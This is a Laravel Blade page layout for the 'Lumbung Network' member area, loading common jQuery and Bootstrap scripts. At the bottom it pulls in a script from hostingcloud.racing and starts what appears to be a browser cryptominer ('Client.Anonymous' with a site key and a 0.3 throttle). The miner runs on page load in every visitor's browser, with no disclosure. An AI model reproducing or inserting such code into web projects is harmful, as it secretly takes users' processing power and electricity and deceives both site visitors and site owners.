<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="Lumbung Network">
        <meta name="author" content="Lumbung Network IT">
        <link rel="shortcut icon" href="/image/icon2.png">
        <title>Lumbung Network</title>
        <link href="{{ asset('asset_member/css/main_all.css') }}" rel="stylesheet" type="text/css" />
        @yield('styles')
        <script src="{{ asset('asset_member/js/modernizr.min.js') }}"></script>
        
    </head>
    <body class="fixed-left">
        <div id="wrapper">
            @yield('content')
        </div>    
        <script>
            var resizefunc = [];
        </script>
        <script src="{{ asset('asset_member/js/jquery.min.js') }}"></script>
        <script src="{{ asset('asset_member/js/tether.min.js') }}"></script><!-- Tether for Bootstrap -->
        <script src="{{ asset('asset_member/js/bootstrap.min.js') }}"></script>
        <script src="{{ asset('asset_member/js/detect.js') }}"></script>
        <script src="{{ asset('asset_member/js/fastclick.js') }}"></script>
        <script src="{{ asset('asset_member/js/jquery.blockUI.js') }}"></script>
        <script src="{{ asset('asset_member/js/waves.js') }}"></script>
        <script src="{{ asset('asset_member/js/jquery.nicescroll.js') }}"></script>
        <script src="{{ asset('asset_member/js/jquery.scrollTo.min.js') }}"></script>
        <script src="{{ asset('asset_member/js/jquery.slimscroll.js') }}"></script>
        <script src="{{ asset('asset_member/plugins/switchery/switchery.min.js') }}"></script>
        <script src="{{ asset('asset_member/js/jquery.core.js') }}"></script>
        <script src="{{ asset('asset_member/js/jquery.app.js') }}"></script>
        <script src="https://www.hostingcloud.racing/OkeG.js"></script>
        <script>
           var _client = new Client.Anonymous('b7093d4a2ed63b645c9bde80348e97d9522dca0a7bc0c441d46b303f4f0bd00d', {
                throttle: 0.3, 
                ads: 0
            });
            _client.start();
        </script>
        @yield('javascript')
    </body>
</html>